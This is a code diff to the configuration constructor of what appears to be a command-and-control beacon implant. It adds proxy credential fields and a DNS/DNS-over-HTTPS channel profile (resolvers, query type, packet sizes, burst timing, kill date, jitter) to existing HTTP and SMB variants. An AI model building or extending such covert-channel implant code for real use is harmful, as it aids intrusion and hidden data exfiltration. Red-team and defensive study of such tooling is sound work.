@@ -4,13 +4,13 @@
 #include "utils.h"
 #include "config.h"
 
-void* AgentConfig::operator new(size_t sz)
+void* AgentConfig::operator new(size_t sz) 
 {
 	void* p = MemAllocLocal(sz);
 	return p;
 }
 
-void AgentConfig::operator delete(void* p) noexcept
+void AgentConfig::operator delete(void* p) noexcept 
 {
 	MemFreeLocal(&p, sizeof(AgentConfig));
 }
@@ -49,6 +49,12 @@ AgentConfig::AgentConfig()
 	this->profile.ans_pre_size = packer->Unpack32();
 	this->profile.ans_size     = packer->Unpack32() + this->profile.ans_pre_size;
 
+	this->profile.proxy_type     = (BYTE) packer->Unpack32();
+	this->profile.proxy_host     = packer->UnpackBytesCopy(&length);
+	this->profile.proxy_port     = (WORD) packer->Unpack32();
+	this->profile.proxy_username = packer->UnpackBytesCopy(&length);
+	this->profile.proxy_password = packer->UnpackBytesCopy(&length);
+
 	this->listener_type = 0;
 
 	this->kill_date    = packer->Unpack32();
@@ -57,7 +63,6 @@ AgentConfig::AgentConfig()
 	this->jitter_delay = packer->Unpack32();
 
 #elif defined(BEACON_SMB)
-
 	this->profile.pipename = packer->UnpackBytesCopy(&length);
 	this->listener_type    = packer->Unpack32();
 	this->kill_date        = packer->Unpack32();
@@ -74,11 +79,35 @@ AgentConfig::AgentConfig()
 	this->sleep_delay     = 0;
 	this->jitter_delay    = 0;
 
+#elif defined(BEACON_DNS)
+	this->profile.domain        = packer->UnpackBytesCopy(&length);
+	this->profile.resolvers     = packer->UnpackBytesCopy(&length);
+	this->profile.doh_resolvers = packer->UnpackBytesCopy(&length);
+	this->profile.qtype         = packer->UnpackBytesCopy(&length);
+	this->profile.pkt_size      = packer->Unpack32();
+	this->profile.label_size    = packer->Unpack32();
+	this->profile.ttl           = packer->Unpack32();
+	this->profile.encrypt_key   = this->encrypt_key;
+	this->profile.burst_enabled = packer->Unpack32();
+	this->profile.burst_sleep   = packer->Unpack32();
+	this->profile.burst_jitter  = packer->Unpack32();
+	this->profile.dns_mode      = packer->Unpack32();
+	this->profile.user_agent    = packer->UnpackBytesCopy(&length);
+
+	this->listener_type = packer->Unpack32();
+	this->kill_date     = packer->Unpack32();
+	this->working_time  = packer->Unpack32();
+	this->sleep_delay   = packer->Unpack32();
+	this->jitter_delay  = packer->Unpack32();
+
 #endif
 
-	this->download_chunk_size = 0x19000;
+#if defined(BEACON_DNS)
+	this->download_chunk_size = 0x8000; // 32 KB
+#else
+	this->download_chunk_size = 0x19000; // ~100KB 
+#endif
 
 	delete packer;
 	MemFreeLocal((LPVOID*)&ProfileBytes, size);
-
 }
